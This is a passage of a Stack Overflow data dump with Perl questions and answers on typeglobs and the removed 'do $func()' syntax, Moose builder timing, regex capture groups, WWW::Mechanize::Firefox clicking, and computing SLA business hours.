"body": "<code>perl -i~ -pe&#39;s&#47;do (\\$?\\w+)(?=\\()&#47;$1-&gt;&#47;g&#39; *.pl</code> or something similar should fix them all."}], "tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": false, "score": 14, "last_activity_date": 1457105158, "last_edit_date": 1457105158, "creation_date": 1457031913, "answer_id": 35780812, "question_id": 35780426, "link": "https://stackoverflow.com/questions/35780426/what-does-the-perl-asterisk-sigil-do/35780812#35780812", "title": "What does the Perl asterisk sigil do", "body": "<p>The syntax error has nothing to do with the globs (the symbols with the asterisk sigil). The syntax error is due to the removal of <code>do $func(LIST)</code> in 5.20. Replace</p>\n\n<pre><code>$ret = do $foreachFunc(*eventWEH, @args);\n</code></pre>\n\n<p>with</p>\n\n<pre><code>$ret = $foreachFunc-&gt;(*eventWEH, @args);\n</code></pre>\n\n<hr>\n\n<p>As for your literal question, <code>*foo</code> is a typeglob, or glob for short. A glob is a proxy of an instance of the following C structure:</p>\n\n<pre><code>struct gp {\n    SV *        gp_sv;          /* scalar value */\n    struct io * gp_io;          /* filehandle value */\n    CV *        gp_cv;          /* subroutine value */\n    U32         gp_cvgen;       /* generational validity of cached gp_cv */\n    U32         gp_refcnt;      /* how many globs point to this? */\n    HV *        gp_hv;          /* hash value */\n    AV *        gp_av;          /* array value */\n    CV *        gp_form;        /* format value */\n    GV *        gp_egv;         /* effective gv, if *glob */\n    PERL_BITFIELD32 gp_line:31; /* line first declared at (for -w) */\n    PERL_BITFIELD32 gp_flags:1;\n    HEK *       gp_file_hek;    /* file first declared in (for -w) */\n};\n</code></pre>\n\n<p>Globs are primarily used internally, though some file handles are primarily accessed via named globs (<code>*STDIN</code>, <code>*STDOUT</code> and <code>*STDERR</code>), and they are used to create aliases (<code>*foo = \\&amp;bar;</code>).</p>\n"}, {"comments": [{"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1457032648, "post_id": 35780892, "comment_id": 59233468, "body": "In the current days, we still use typeglobs to pass around file handles. We just store references to them in scalars. <code>print(&quot;$event_fh\\n&quot;);</code>."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1457033016, "post_id": 35780892, "comment_id": 59233671, "body": "We don&#39;t need to, though. We could place a file handle directly into a scalar. <code>perl -e&#39;my $fh = \\*STDOUT; print($fh &quot;$fh\\n&quot;); $fh = *$fh{IO}; print($fh &quot;$fh\\n&quot;);&#39;</code>"}], "tags": [], "owner": {"reputation": 81037, "user_id": 8454, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/2NlHs.png?s=128&g=1", "display_name": "Andy Lester", "link": "https://stackoverflow.com/users/8454/andy-lester"}, "is_accepted": false, "score": 1, "last_activity_date": 1457032136, "creation_date": 1457032136, "answer_id": 35780892, "question_id": 35780426, "link": "https://stackoverflow.com/questions/35780426/what-does-the-perl-asterisk-sigil-do/35780892#35780892", "title": "What does the Perl asterisk sigil do", "body": "<p>In the old days, you'd have to use a typeglob to pass around a file handle, like here:</p>\n\n<pre><code># eventWEH is a global filehandle\nopen( eventWEH, $filename ) or die \"Couldn't open $filename: $!\";\nsomefunc( *eventWEH );\n</code></pre>\n\n<p>But nowadays you have proper lexical filehandles, so you can do</p>\n\n<pre><code>my $event_fh;\nopen( $event_fh, '&lt;', $filename ) or die \"Couldn't open $filename: $!\";\nsomefunc( $event_fh );\n</code></pre>\n"}], "owner": {"reputation": 161, "user_id": 3276159, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/94a03fabcef19db73678047d8326afd7?s=128&d=identicon&r=PG&f=1", "display_name": "user3276159", "link": "https://stackoverflow.com/users/3276159/user3276159"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1828, "favorite_count": 2, "answer_count": 4, "score": 7, "last_activity_date": 1457156916, "creation_date": 1457030772, "last_edit_date": 1457033187, "question_id": 35780426, "link": "https://stackoverflow.com/questions/35780426/what-does-the-perl-asterisk-sigil-do", "title": "What does the Perl asterisk sigil do", "body": "<p>I am working on updating some very old Perl code (not my code) and I came across the following in a subroutine:</p>\n\n<pre><code>sub DoEvent {\n   local(*eventWEH, $foreachFunc, @args) = @_;\n   $ret = do $foreachFunc(*eventWEH, @args);\n}\n</code></pre>\n\n<p>This seemed to work fine in Perl 5.6.1 but no longer works in Perl 5.22 which gives a syntax error just after the do $foreachFun( </p>\n\n<p>What is the purpose of the asterisk in front of the variable *eventWEH?</p>\n\n<p>If this were \"C\" I would suggest some sort of pointer.\nAny suggestions?</p>\n\n<p>ETA: This sub gets called with lots of different types for the first parameter. For example:</p>\n\n<pre><code> &amp;DoEvent($abc, \"DoAbc\", @args);\n</code></pre>\n\n<p>and </p>\n\n<pre><code> &amp;DoEvent(@xyz, \"DoXyz\", @args);\n</code></pre>\n\n<p>So as per the answers given, it looks like the *eventWEH can take on a different data type to match whatever parameter is passed to the sub.</p>\n"}, {"tags": ["perl", "class", "oop", "package", "moose"], "comments": [{"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1457028354, "post_id": 35779562, "comment_id": 59230965, "body": "See the section on laziness in <a href=\"https://metacpan.org/pod/Moose::Manual::Attributes#Laziness\" rel=\"nofollow noreferrer\">Moose::Manual::Attributes</a>."}], "answers": [{"comments": [{"owner": {"reputation": 52334, "user_id": 702638, "user_type": "registered", "accept_rate": 98, "profile_image": "https://www.gravatar.com/avatar/892f65bc0a8a0949ab88598de7d83cab?s=128&d=identicon&r=PG", "display_name": "Hunter McMillen", "link": "https://stackoverflow.com/users/702638/hunter-mcmillen"}, "edited": false, "score": 0, "creation_date": 1457029169, "post_id": 35779735, "comment_id": 59231453, "body": "The return value of the builder method is the value that the attribute receives. So shouldn&#39;t the builder <code>return $log</code> instead setting the attribute?"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "reply_to_user": {"reputation": 52334, "user_id": 702638, "user_type": "registered", "accept_rate": 98, "profile_image": "https://www.gravatar.com/avatar/892f65bc0a8a0949ab88598de7d83cab?s=128&d=identicon&r=PG", "display_name": "Hunter McMillen", "link": "https://stackoverflow.com/users/702638/hunter-mcmillen"}, "edited": false, "score": 0, "creation_date": 1457031132, "post_id": 35779735, "comment_id": 59232565, "body": "@Hunter McMillen, I suggested <i>alternatives</i> to using a <code>builder</code> attribute."}, {"owner": {"reputation": 52334, "user_id": 702638, "user_type": "registered", "accept_rate": 98, "profile_image": "https://www.gravatar.com/avatar/892f65bc0a8a0949ab88598de7d83cab?s=128&d=identicon&r=PG", "display_name": "Hunter McMillen", "link": "https://stackoverflow.com/users/702638/hunter-mcmillen"}, "edited": false, "score": 0, "creation_date": 1457033623, "post_id": 35779735, "comment_id": 59234078, "body": "I was referring to your correction of <code>_initialize_log</code>."}], "tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": true, "score": 4, "last_activity_date": 1457033902, "last_edit_date": 1457033902, "creation_date": 1457028460, "answer_id": 35779735, "question_id": 35779562, "link": "https://stackoverflow.com/questions/35779562/moose-attribute-not-defined-in-builder-method/35779735#35779735", "title": "Moose Attribute Not Defined in Builder Method", "body": "<p>The object is still being constructed! Delay your attribute's initialization until after it's constructed. The following delays its initialization until it's used:</p>\n\n<pre><code>lazy =&gt; 1\n</code></pre>\n\n<p>You could also use a <a href=\"http://search.cpan.org/dist/Moose/lib/Moose/Manual/Construction.pod#BUILD\" rel=\"nofollow\"><code>BUILD</code></a> method instead.</p>\n\n<pre><code>sub BUILD {\n   my $self = shift;\n   $self-&gt;_initialize_log();\n}\n</code></pre>\n\n<hr>\n\n<p>Note that you had three bugs in <code>_initialize_log</code>:</p>\n\n<pre><code>sub _initialize_log\n{\n    my $self = shift;              # &lt;-- Won't even compile without this!\n    my $log = \"****\\n\";\n    $log .= $self-&gt;name . \"\\n\";    # &lt;-- Removed reliance on Moose internals\n    $log .= `date`;\n    $log .= \"****\\n\";\n    return $log;                   # &lt;-- The value is to be returned.\n}\n</code></pre>\n\n<p>To call it from <code>BUILD</code> instead of as a builder, you'll need to change it as follows:</p>\n\n<pre><code>sub _initialize_log\n{\n    my $self = shift;\n    my $log = \"****\\n\";\n    $log .= $self-&gt;name . \"\\n\";\n    $log .= `date`;\n    $log .= \"****\\n\";\n    $self-&gt;log($log);              # &lt;--\n}\n</code></pre>\n"}], "owner": {"reputation": 791, "user_id": 1766625, "user_type": "registered", "accept_rate": 74, "profile_image": "https://www.gravatar.com/avatar/75a86f865d7a31e835edabd03fc54c7d?s=128&d=identicon&r=PG", "display_name": "kernelpanic", "link": "https://stackoverflow.com/users/1766625/kernelpanic"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 202, "favorite_count": 0, "accepted_answer_id": 35779735, "answer_count": 1, "score": 1, "last_activity_date": 1457033902, "creation_date": 1457027895, "question_id": 35779562, "link": "https://stackoverflow.com/questions/35779562/moose-attribute-not-defined-in-builder-method", "title": "Moose Attribute Not Defined in Builder Method", "body": "<p>I'm using Moose to create an object but the builder method '_initialize_log' is not able to retrieve the value of the name attribute.  </p>\n\n<p>Is there a way for me to run the method only after that attribute has been set?</p>\n\n<p><strong>EFT.pm</strong></p>\n\n<pre><code>package EFT;\nuse Moose;\n\n# Attributes\nhas name =&gt; (\n    is       =&gt; \"ro\",\n    isa      =&gt; \"Str\",\n    required =&gt; 1\n);\n\nhas log =&gt; (\n    is      =&gt; 'rw',\n    isa     =&gt; 'Str',\n    builder =&gt; '_initialize_log'\n);\n\nsub _initialize_log\n{\n    $self-&gt;{'log'} = \"****\\n\";\n    $self-&gt;{'log'} .= $self-&gt;{'name'} . \"\\n\";\n    $self-&gt;{'log'} .= `date`;\n    $self-&gt;{'log'} .= \"****\\n\";\n}\n</code></pre>\n\n<p><strong>test.pl</strong></p>\n\n<pre><code>#!/usr/bin/perl\n\nuse strict;\nuse warnings;\nuse EFT;\n\n# Constants\nuse constant NAME =&gt; 'Test Script';\n\n# Create script object\nmy $script = EFT-&gt;new(name =&gt; NAME);\n\nprint $script-&gt;{'log'};\n</code></pre>\n\n<p><strong>Output</strong></p>\n\n<pre><code>Use of uninitialized value in concatenation (.) or string at EFT.pm line 46.\n****\n\nThu Mar  3 12:54:31 EST 2016\n****\n</code></pre>\n"}, {"tags": ["regex", "perl"], "answers": [{"comments": [{"owner": {"reputation": 110, "user_id": 5980691, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-GRr-X6BCGZ4/AAAAAAAAAAI/AAAAAAAAhEI/1q4lSS2p5Ks/photo.jpg?sz=128", "display_name": "Joel Foust", "link": "https://stackoverflow.com/users/5980691/joel-foust"}, "edited": false, "score": 0, "creation_date": 1457026179, "post_id": 35778331, "comment_id": 59229631, "body": "Yep, simply storing them in the array gave me enough to use my basic perl knowledge to get it working.  The other grouping and capturing methods are very educational, thank you!"}], "tags": [], "owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "is_accepted": true, "score": 6, "last_activity_date": 1457025438, "last_edit_date": 1457025438, "creation_date": 1457024380, "answer_id": 35778331, "question_id": 35778278, "link": "https://stackoverflow.com/questions/35778278/dynamically-extracting-multiple-parts-of-a-string-perl-regex/35778331#35778331", "title": "Dynamically extracting multiple parts of a string Perl/Regex", "body": "<p>If you're matching a regex, you can capture 'matches' into an array:</p>\n\n<pre><code>my @matches = $time =~ /(\\d\\d):(\\d\\d):(\\d\\d)/g;  \n</code></pre>\n\n<p>This will then match multiple times, and plonk 'hits' in to the <code>@matches</code> array. </p>\n\n<p>So to take your above example:</p>\n\n<pre><code>#!/usr/bin/env perl\nuse strict;\nuse warnings;\nuse Data::Dumper;\n\nmy $str = \"11:22:33 somefhunakdawer 14:32:17\"; \n\nmy @matches = $str =~ /(\\d\\d):(\\d\\d):(\\d\\d)/g;\n\nprint Dumper \\@matches;\n</code></pre>\n\n<p>This will give you an array with:</p>\n\n<pre><code>$VAR1 = [\n          '11',\n          '22',\n          '33',\n          '14',\n          '32',\n          '17'\n        ];\n</code></pre>\n\n<p>Although - you'll have to read you array in 3-element chunks.</p>\n\n<p>Alternatively - you can 'group' your capture, depending precisely what you're after:</p>\n\n<pre><code>my $str = \"11:22:33 somefhunakdawer 14:32:17\"; \nmy $pattern = qr/(\\d\\d):(\\d\\d):(\\d\\d)/; \n\nmy @matches = $str =~ m/($pattern)/g;\n\nprint Dumper \\@matches;\n</code></pre>\n\n<p>This'll give you:</p>\n\n<pre><code>$VAR1 = [\n          '11:22:33',\n          '11',\n          '22',\n          '33',\n          '14:32:17',\n          '14',\n          '32',\n          '17'\n        ];\n</code></pre>\n\n<p>It's a bit hard to take an input pattern and 'merge' it, but you could do something like:</p>\n\n<pre><code>my $str = \"11:22:33 somefhunakdawer 14:32:17\"; \nmy $pattern = qr/\\d\\d:\\d\\d:\\d\\d/; \n\nmy @matches = map {[ split /:/ ]} $str =~ m/($pattern)/g;\n\nprint Dumper \\@matches;\n</code></pre>\n\n<p>This selects instances of <code>$pattern</code>, but then uses <code>map</code> to split it on a delimiter, into a sub array. Thus we get:</p>\n\n<pre><code>$VAR1 = [\n          [\n            '11',\n            '22',\n            '33'\n          ],\n          [\n            '14',\n            '32',\n            '17'\n          ]\n        ];\n</code></pre>\n\n<p>In both cases though, you need a bit more logic to it - you can tell, if you've got 3 capture groups in your input, you'll have a multiple of 3 in your <code>@matches</code>. </p>\n\n<p>If you wanted to dynamically detect, you could probably double-match:</p>\n\n<pre><code>my $str = \"11:22:33 somefhunakdawer 14:32:17\"; \nmy $pattern = qr/(\\d\\d):(\\d\\d):(\\d\\d)/; \n\nmy @matches = $str =~ m/$pattern/;\nmy $num_groups = @matches; \n@matches = $str =~ m/$pattern/g; \n\nwhile ( @matches ) { \n   print \"Group : \", join (\"-\", splice ( @matches, 0, $num_groups )),\"\\n\";\n}\n</code></pre>\n\n<p>The first capture (without <code>g</code>) tells you how many capture groups this pattern generates. </p>\n\n<p>Then you run a second capture - with <code>g</code> - to repeat the capture into the array, and then extract a number of capture groups from the list of matches. </p>\n\n<p>Although note - this approach will fail if there's variable-capture groups in the input pattern - e.g. </p>\n\n<pre><code>my $pattern = qr/(\\d{2}):(\\d{2})(?::(\\d{2}))?/; \n</code></pre>\n\n<p>which has optional 'seconds' match</p>\n"}], "owner": {"reputation": 110, "user_id": 5980691, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-GRr-X6BCGZ4/AAAAAAAAAAI/AAAAAAAAhEI/1q4lSS2p5Ks/photo.jpg?sz=128", "display_name": "Joel Foust", "link": "https://stackoverflow.com/users/5980691/joel-foust"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1114, "favorite_count": 0, "accepted_answer_id": 35778331, "answer_count": 1, "score": 3, "last_activity_date": 1457025438, "creation_date": 1457024227, "last_edit_date": 1457024265, "question_id": 35778278, "link": "https://stackoverflow.com/questions/35778278/dynamically-extracting-multiple-parts-of-a-string-perl-regex", "title": "Dynamically extracting multiple parts of a string Perl/Regex", "body": "<p>So this probably has a very simple solution but I'm pretty green in Perl....  For simplicity sake, I'll use a simple example:</p>\n\n<pre><code># extract hours, minutes, seconds\n$time =~ /(\\d\\d):(\\d\\d):(\\d\\d)/;  # match hh:mm:ss format\n$hours = $1;\n$minutes = $2;\n$seconds = $3;\n</code></pre>\n\n<p>The application I'm writing allows the user to input a regex string that may have multiple matches like in the example.  I'm looking for a way to know how many <code>$&lt;n&gt;</code>'s are available to me based on the regex the user entered.  Is there a way to see if $1,$2....$n were defined during the current matching process?  I'm using:\n<code>$parsed_response =~ /$block_start_regex/;</code>\nwhere $block_start_regex could be something like <code>$block_start_regex=qr/(\\S+)\\s+(\\S+)\\s+(\\S+)/;</code> or whatever the user enters.....</p>\n\n<p>Also, if I match earlier in the code on 9 variables, are they all set back to undefined the next time I run a regex match?</p>\n"}, {"tags": ["javascript", "html", "perl", "www-mechanize-firefox"], "answers": [{"comments": [{"owner": {"reputation": 307, "user_id": 6013979, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/a9a594885e641ccaa827d19d1ca303c4?s=128&d=identicon&r=PG&f=1", "display_name": "yulivee", "link": "https://stackoverflow.com/users/6013979/yulivee"}, "edited": false, "score": 0, "creation_date": 1457342774, "post_id": 35778183, "comment_id": 59346278, "body": "Thank you for your suggestion!I have tried this approach, but after the first click, the program hangs. I guess I have to synchronize the click again, but trying <code>$mech-&gt;click($plusses[0], {synchronize =&gt; 0});</code> did hang as well in my debugger."}], "tags": [], "owner": {"reputation": 19681, "user_id": 936986, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/075f0ea7418371ace9bba5b901409ab1?s=128&d=identicon&r=PG", "display_name": "Oleg V. Volkov", "link": "https://stackoverflow.com/users/936986/oleg-v-volkov"}, "is_accepted": true, "score": 1, "last_activity_date": 1457023922, "creation_date": 1457023922, "answer_id": 35778183, "question_id": 35776474, "link": "https://stackoverflow.com/questions/35776474/wwwmechanizefirefox-clicking-all-images-of-a-class/35778183#35778183", "title": "WWW::Mechanize::Firefox clicking all images of a class", "body": "<p>You have Perl array with image objects already - just iterate over it, instead of asking mech to iterate over its collection.</p>\n\n<pre><code>foreach (@images) { $mech-&gt;click($_) }\n</code></pre>\n"}], "owner": {"reputation": 307, "user_id": 6013979, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/a9a594885e641ccaa827d19d1ca303c4?s=128&d=identicon&r=PG&f=1", "display_name": "yulivee", "link": "https://stackoverflow.com/users/6013979/yulivee"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 185, "favorite_count": 0, "accepted_answer_id": 35778183, "answer_count": 1, "score": 1, "last_activity_date": 1457023922, "creation_date": 1457019442, "question_id": 35776474, "link": "https://stackoverflow.com/questions/35776474/wwwmechanizefirefox-clicking-all-images-of-a-class", "title": "WWW::Mechanize::Firefox clicking all images of a class", "body": "<p>I am trying to crawl all links on an internal site using WWW::Mechanize::Firefox. The site loads some content via javascript, so I have to click certain elements of the same class \"expand\" at first. The structure of the site is like this:</p>\n\n<pre><code>&lt;table&gt;\n  &lt;tr&gt;\n    &lt;td&gt;\n     &lt;a id=\"xyz\" href=\"somesite\"&gt; Content &lt;/a&gt;\n    &lt;/td&gt;\n  &lt;/tr&gt;\n  &lt;tr&gt;\n    &lt;td&gt;\n      &lt;div&gt;\n        &lt;a id=\"twistie\" onclick=\"expand_this\"&gt;\n          &lt;img class=\"expand\" border=\"0\" width=\"13\" height=\"13\" alt=\"Show All\" title=\"Show All\" src=\"images/plus.gif\"&gt;\n        &lt;/a&gt;\n      &lt;/div&gt;\n    &lt;/td&gt;\n   &lt;/tr&gt;\n&lt;/table&gt;\n</code></pre>\n\n<p>clicking on the image loads more content in the div-container. On the site, there are multiple of these images of class expand, and I have to click them all for accessing all content. This is where I fail.</p>\n\n<p>What I have tried so far:</p>\n\n<pre><code>$mech-&gt;click( { xpath =&gt; '//img[@class=\"expand\"]', synchronize =&gt; 0 } );\n</code></pre>\n\n<p>This clicks only the first of the image-elements.</p>\n\n<pre><code>my @images = $mech-&gt;xpath( '//img[@class=\"expand\"]', synchronize =&gt; 0 );\n</code></pre>\n\n<p>returns as many array elements as I can count manually on my page. However, I am a bit lost on how to insert the array-elements returned into the click-action.</p>\n\n<p>I can open the first element with</p>\n\n<pre><code>$mech-&gt;click( { xpath =&gt; '//img[@class=\"expand\"][0]', synchronize =&gt; 0 } );\n</code></pre>\n\n<p>But</p>\n\n<pre><code>$mech-&gt;click( { xpath =&gt; '//img[@class=\"expand\"][1]', synchronize =&gt; 0 } );\n</code></pre>\n\n<p>returns me</p>\n\n<pre><code>No elements found for //img[@class=\"expand\"][1] at (eval 1377)[/usr/share/perl/5.18/perl5db.pl:732] line 2.\n</code></pre>\n\n<p>I tried this approach further:</p>\n\n<pre><code>foreach my $id ( 0 .. scalar @images ) { \n    print $id, \"\\n\";\n    $mech-&gt;click( { xpath =&gt; qq(//img[\\@class=\"expand\"][\"$id\"]), synchronize =&gt; 0 }); \n\n}   \n</code></pre>\n\n<p>but this doesn't open up any elements (no idea why).</p>\n\n<p>Am I missing something here? What do I need to do to click all img-tags of a shared class, as the images unfortunately miss an id?</p>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1457049003, "post_id": 35774218, "comment_id": 59242050, "body": "If you show some sample data you will be more likely to get an accurate solution"}], "answers": [{"tags": [], "owner": {"reputation": 6592, "user_id": 3005251, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a5331f7e467aae3d581fe8bc814ef572?s=128&d=identicon&r=PG", "display_name": "bolav", "link": "https://stackoverflow.com/users/3005251/bolav"}, "is_accepted": false, "score": 1, "last_activity_date": 1457014567, "creation_date": 1457014567, "answer_id": 35774614, "question_id": 35774218, "link": "https://stackoverflow.com/questions/35774218/how-can-i-calculate-business-sla-hours-with-iterating-over-each-second/35774614#35774614", "title": "How can I calculate business/SLA hours with iterating over each second?", "body": "<p>I would not iterate over the seconds. Depending on the cost of your calculations that could be quite costly. It would be better to calculate the borders between core/outside core.</p>\n\n<pre><code>use strict;\nuse warnings;\n\nmy $customer_time;\nmy $our_time_outside;\nmy $our_time_core;\n\nforeach my $event ($ticket-&gt;events) {\n    my $current_ts = $event-&gt;start_ts;\n    while ($current_ts &lt; $event-&gt;end_ts) {\n        if ($event-&gt;status eq 'stalled') {\n            $customer_time += $event-&gt;end_ts - $current_ts;\n            $current_ts = $event-&gt;end_ts;\n        }\n        elsif (is_core_hours($current_ts)) {\n            my $next_ts = min(end_of_core_hours($current_ts), $event-&gt;end_ts);\n            $our_time_core += $next_ts - $current_ts;\n            $current_ts = $next_ts;\n        }\n        else {\n            my $next_ts = min(start_of_core_hours($current_ts), $event-&gt;end_ts);\n            $our_time_outside += $next_ts - $current_ts;\n            $current_ts = $next_ts;\n        }\n\n    }\n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "is_accepted": false, "score": 0, "last_activity_date": 1457017522, "creation_date": 1457017522, "answer_id": 35775734, "question_id": 35774218, "link": "https://stackoverflow.com/questions/35774218/how-can-i-calculate-business-sla-hours-with-iterating-over-each-second/35775734#35775734", "title": "How can I calculate business/SLA hours with iterating over each second?", "body": "<p>I can't see why you'd want to iterate over every second. That seems very wasteful.</p>\n\n<ul>\n<li>Get a list of all of the events for a given ticket.</li>\n<li>Add to the list any boundaries between core and non-core times.</li>\n<li>Sort this list into chronological order.</li>\n<li>For each consecutive pair of events in the list, subtract the later from the earlier to get a duration.</li>\n<li>Add that duration to the appropriate bucket.</li>\n</ul>\n\n<p>And the usual caveats for dealing with dates and times apply here:</p>\n\n<ul>\n<li>Use a library (I recommend <a href=\"https://metacpan.org/pod/DateTime\" rel=\"nofollow\">DateTime</a> together with <a href=\"https://metacpan.org/pod/DateTime::Duration\" rel=\"nofollow\">DateTime::Duration</a>)</li>\n<li>Convert all of your timestamps to UTC as soon as you get them. Only convert back to local time just before displaying them to the user.</li>\n</ul>\n"}, {"comments": [{"owner": {"reputation": 365, "user_id": 2358228, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/6f595ca3be59a0dac59dbea162af1654?s=128&d=identicon&r=PG", "display_name": "Dan Walker", "link": "https://stackoverflow.com/users/2358228/dan-walker"}, "edited": false, "score": 0, "creation_date": 1457090962, "post_id": 35785643, "comment_id": 59259528, "body": "Hi, thanks, you&#39;ve helped me out. The only issue I&#39;m facing, is let&#39;s say ticket is new at 07:00 and then resolved at 10:00 - that means 3h or 180 mins to resolve. It&#39;s easy to work out $duration=$end-$start, but how do I then work out, without iteration, that since our business hours are 08:00 onwards, that we have a non-core value of 60 mins, and a core value of 120 mins?   This also must span days, so if a ticket was new 7am Monday, resolved 10am Wednesday, it&#39;s easy to work out durations etc but then working out core vs non-core hours is what lead me to thinking of just iterating secs/mins"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 365, "user_id": 2358228, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/6f595ca3be59a0dac59dbea162af1654?s=128&d=identicon&r=PG", "display_name": "Dan Walker", "link": "https://stackoverflow.com/users/2358228/dan-walker"}, "edited": false, "score": 0, "creation_date": 1457101870, "post_id": 35785643, "comment_id": 59266675, "body": "That&#39;s why I suggest mixing the changes between core and non-core time in with the sorted status change events. At these points every ticket that has had an <code>open</code> event but not a <code>close</code> event should have its time in the current state incremented by the duration of the preceding interval. Its <i>identical</i> to what you would do at one-second intervals except that the intervals vary in length and cover periods where nothing at all changes. If you have some test data then I can write an example program"}, {"owner": {"reputation": 365, "user_id": 2358228, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/6f595ca3be59a0dac59dbea162af1654?s=128&d=identicon&r=PG", "display_name": "Dan Walker", "link": "https://stackoverflow.com/users/2358228/dan-walker"}, "edited": false, "score": 0, "creation_date": 1457102642, "post_id": 35785643, "comment_id": 59267249, "body": "I&#39;ve re-read what you wrote a couple of times. Due to the system in use, I have to loop in a fashion similar to &#39;foreach transactions as transaction&#39;, but there&#39;s nothing saying I couldn&#39;t then simply stick these transactions in to a list/array, and then act upon them. Am I getting the wrong idea, or are you saying I should have my list of events (known as transactions) and then inject additional transactions for changes between core/non-core hours?"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 365, "user_id": 2358228, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/6f595ca3be59a0dac59dbea162af1654?s=128&d=identicon&r=PG", "display_name": "Dan Walker", "link": "https://stackoverflow.com/users/2358228/dan-walker"}, "edited": false, "score": 0, "creation_date": 1457102974, "post_id": 35785643, "comment_id": 59267495, "body": "@DanWalker: Don&#39;t work from the database. Pull out an array of all the transactions you&#39;re interested in, add the core/non-core switch events, sort everything by time, and process it. What sublanguage is <code>foreach transactions as transaction</code>?"}, {"owner": {"reputation": 365, "user_id": 2358228, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/6f595ca3be59a0dac59dbea162af1654?s=128&d=identicon&r=PG", "display_name": "Dan Walker", "link": "https://stackoverflow.com/users/2358228/dan-walker"}, "edited": false, "score": 0, "creation_date": 1457336901, "post_id": 35785643, "comment_id": 59343299, "body": "Well you say &#39;interested in&#39; but I&#39;ll need to pull a list of all transactions to figure out what I&#39;m interested in. The language is Perl."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 365, "user_id": 2358228, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/6f595ca3be59a0dac59dbea162af1654?s=128&d=identicon&r=PG", "display_name": "Dan Walker", "link": "https://stackoverflow.com/users/2358228/dan-walker"}, "edited": false, "score": 0, "creation_date": 1457376542, "post_id": 35785643, "comment_id": 59368716, "body": 